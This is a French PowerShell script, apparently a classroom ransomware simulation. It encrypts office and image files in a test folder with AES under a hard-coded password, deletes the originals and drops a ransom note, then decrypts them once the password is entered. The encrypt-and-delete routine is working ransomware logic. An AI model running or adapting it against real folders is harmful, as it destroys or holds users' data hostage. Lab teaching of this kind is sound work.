$password = "TP2026"
$folder = "D:\Desktop\tp-simulation"

if (-not (Test-Path $folder)) {
    $folder = "C:\tp-simulation"
    New-Item -ItemType Directory -Path $folder | Out-Null
    "Contenu fichier texte" | Out-File "$folder\fichier_test.txt" -Encoding UTF8
    "Contenu fichier pdf simulé" | Out-File "$folder\fichier_test.pdf" -Encoding UTF8
    "Contenu fichier excel simulé" | Out-File "$folder\fichier_test.xlsx" -Encoding UTF8
    Write-Host "Dossier et fichiers crees : $folder" -ForegroundColor Green
}

$sha = New-Object System.Security.Cryptography.SHA256Managed
$key = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($password))

# --- CHIFFREMENT ---
$files = Get-ChildItem $folder -File -Include "*.txt","*.docx","*.pdf","*.xlsx","*.jpg","*.png" -Recurse

foreach ($file in $files)
{
    $data = [System.IO.File]::ReadAllBytes($file.FullName)
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.GenerateIV()
    $encryptor = $aes.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($data, 0, $data.Length)
    $result = $aes.IV + $encryptedData
    $outputFile = $file.FullName + ".locked"
    [System.IO.File]::WriteAllBytes($outputFile, $result)
    Remove-Item $file.FullName -Force
    Write-Host "Chiffre :" $file.Name
}

# --- NOTE DE RANSON ---
$ransom = @"
==========================================================
==========================================================
            VOS FICHIERS ONT ETE CHIFFRES
==========================================================

Tous vos fichiers .txt ont ete chiffres avec AES-256.
Les fichiers originaux ont ete supprimes.

Pour recuperer vos fichiers, vous devez entrer le mot de passe.

Lancez le script de dechiffrement et entrez le mot de passe.

----------------------------------------------------------
----------------------------------------------------------
"@
$utf8Bom = New-Object System.Text.UTF8Encoding $true
[System.IO.File]::WriteAllText("$folder\README_DECRYPT.txt", $ransom, $utf8Bom)
Write-Host "Note de rancon creee : README_DECRYPT.txt"


Write-Host ""
Write-Host "Tous les fichiers sont chiffres. Consulter README_DECRYPT.txt"
Write-Host ""

# --- DEMANDE MOT DE PASSE ---
$userPassword = Read-Host "Entrer le mot de passe pour dechiffrer"

if ($userPassword -ne $password)
{
    Write-Host "Mot de passe incorrect."
    exit
}

# --- DECHIFFREMENT ---
$encryptedFiles = Get-ChildItem $folder -File -Filter "*.locked"

foreach ($encFile in $encryptedFiles)
{
    $data = [System.IO.File]::ReadAllBytes($encFile.FullName)
    $iv = $data[0..15]
    $encryptedData = $data[16..($data.Length - 1)]
    $aes = New-Object System.Security.Cryptography.AesManaged
    $aes.Key = $key
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    $decryptedData = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)
    $originalName = $encFile.FullName -replace '\.locked$', ''
    [System.IO.File]::WriteAllBytes($originalName, $decryptedData)
    Remove-Item $encFile.FullName -Force
    Write-Host "Dechiffre :" $originalName
}

# --- NETTOYAGE ---
Remove-Item "$folder\README_DECRYPT.txt" -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "Tous les fichiers ont ete dechiffres et restaures."